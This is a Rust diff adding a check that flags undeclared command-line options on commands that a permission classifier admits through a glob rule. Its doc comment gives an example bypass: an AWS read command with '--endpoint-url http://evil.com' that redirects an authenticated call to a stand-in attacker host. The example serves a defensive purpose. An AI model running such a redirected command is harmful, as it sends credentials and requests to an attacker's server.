@@ -115,6 +115,51 @@ pub(crate) fn sub_archetypes(tokens: &[Token]) -> Option<Vec<&'static str>> {
 /// ends the flag region. A sub that declares NO flags at all is treated as "not yet enumerated"
 /// rather than "nothing permitted", so this tightens only where a list exists — the global
 /// enforcement of the empty case is staged separately (see the backfill guard).
+/// Whether an invocation admitted by a `first_arg` GLOB carries a flag the family never declared.
+///
+/// The glob path used to allow on the strength of the first positional alone and never look at the
+/// remaining tokens, so `aws kms get-public-key --endpoint-url http://evil.com` classified as an
+/// ordinary read while redirecting an authenticated call to an arbitrary host. The verb claim
+/// (`get-*` means read) is sound and stays; the flags are what needed a list.
+///
+/// An UNDECLARED family (both lists empty) keeps the old permissive behavior — the 240-odd AWS
+/// service groups cannot be researched at once, and denying them wholesale would break every AWS
+/// read. `no_new_unresearched_first_arg_family` in `tests.rs` pins the un-migrated set so the pile
+/// cannot grow.
+///
+/// Non-flag tokens pass: some glob families take positionals (`kubectl get pods`), and the sensitive
+/// ones are already caught earlier by `credential_first_arg`.
+pub(super) fn glob_presents_unlisted_flag(
+    tokens: &[Token],
+    skip: usize,
+    standalone: &[String],
+    valued: &[String],
+) -> bool {
+    if standalone.is_empty() && valued.is_empty() {
+        return false;
+    }
+    let known =
+        |f: &str| standalone.iter().any(|a| a == f) || valued.iter().any(|a| a == f);
+    for t in tokens.iter().skip(skip) {
+        let s = t.as_str();
+        if s == "--" {
+            break;
+        }
+        if !s.starts_with('-') || s == "-" {
+            continue;
+        }
+        let head = s.split_once('=').map_or(s, |(f, _)| f);
+        if known(head) {
+            continue;
+        }
+        if !s.starts_with("--") && s.len() > 2 && s[1..].chars().all(|c| known(&format!("-{c}"))) {
+            continue;
+        }
+        return true;
+    }
+    false
+}
+
 fn presents_unlisted_flag(tokens: &[Token], sub: &types::SubSpec) -> bool {
     // A flag declared as an escalating `[[command.sub.flag]]` IS declared — it just carries a
     // capability rather than sitting on the plain allowlist. Omitting it here would deny the very
